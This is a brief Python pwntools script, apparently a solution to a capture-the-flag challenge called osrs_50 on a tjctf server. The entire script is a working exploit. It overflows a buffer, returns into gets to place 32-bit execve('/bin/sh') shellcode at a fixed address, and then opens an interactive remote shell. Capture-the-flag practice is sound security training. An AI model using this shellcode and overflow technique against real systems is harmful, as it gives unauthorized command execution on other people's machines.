from pwn import *

p = remote('p1.tjctf.org', 8006)
#p = process('./osrs_50')
e = ELF('./osrs_50')

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"
tree = 0x08049ec0

payload = ''
payload += 'a'*0x10c + 'b'*0x4
payload += p32(e.plt['gets'])
payload += p32(tree)
payload += p32(tree)

p.sendlineafter('type: \n', payload)
sleep(0.5)
p.sendline(shellcode)
sleep(0.5)

p.interactive()
